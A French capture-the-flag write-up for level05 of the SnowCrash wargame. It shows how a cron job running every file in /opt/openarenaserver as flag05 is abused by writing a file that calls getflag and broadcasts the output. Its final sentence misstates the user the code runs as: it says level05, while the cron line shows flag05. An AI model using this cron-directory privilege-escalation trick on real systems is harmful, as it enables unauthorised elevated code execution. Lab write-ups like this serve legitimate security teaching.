En se connectant, on remarque le message `You have new mail.`.

Ce qui peut indiquer une information intéressante envoyée par le système.

On inspecte les variables d’environnement avec `env`.

```bash
You have new mail.
level05@SnowCrash:~$ ls
level05@SnowCrash:~$ env
...
MAIL=/var/mail/level05
...
```

Ce chemin mène à un fichier dont on peut lire le contenu.

```bash
level05@SnowCrash:~$ ls -l /var/mail/level05
-rw-r--r--+ 1 root mail 58 Mar 12  2016 /var/mail/level05
```

En lisant le contenu de ce fichier, on découvre une tâche cron :

```bash
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Cette ligne signifie qu’un script (`/usr/sbin/openarenaserver`) est exécuté toutes les 2 minutes en tant qu’utilisateur `flag05`.

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Le script parcourt tous les fichiers dans `/opt/openarenaserver/`, les exécute avec bash dans un environnement restreint (limité à 5 secondes CPU via `ulimit`), puis les supprime.

Exploitation du script avec getflag :

`echo "/bin/getflag | wall" > /opt/openarenaserver/exploit`

Puisqu'il n'y a aucun filtrage sur ce qui est exécuté, on peut faire ce qu'on veut en tant qu'utilisateur **level05**.
